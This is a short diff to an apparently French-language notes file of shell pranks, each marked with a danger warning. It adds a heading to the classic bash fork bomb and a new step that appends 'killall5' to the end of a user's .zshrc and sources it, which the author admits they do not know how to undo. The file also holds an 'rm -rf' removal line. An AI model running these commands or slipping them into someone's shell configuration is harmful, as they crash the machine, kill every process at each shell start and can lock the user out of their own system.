@@ -14,6 +14,12 @@ dans la racine (dossier home)
 Pour enlever -> ```rm -rf .reset```
 
 [-------------------------------------------------------------]
-/!\ DANGER /!\
+/!\ DANGER MAXIMAL /!\
 
 ```:(){ :|:& };:```
+
+[-------------------------------------------------------------]
+/!\ DANGER MAIS CA VA MAIS QUAND MEME BELEK JSP COMMENT ENLEVER /!\
+
+```nano .zshrc``` -> a la toute fin mettre : ```killall5```
+```source .zshrc```
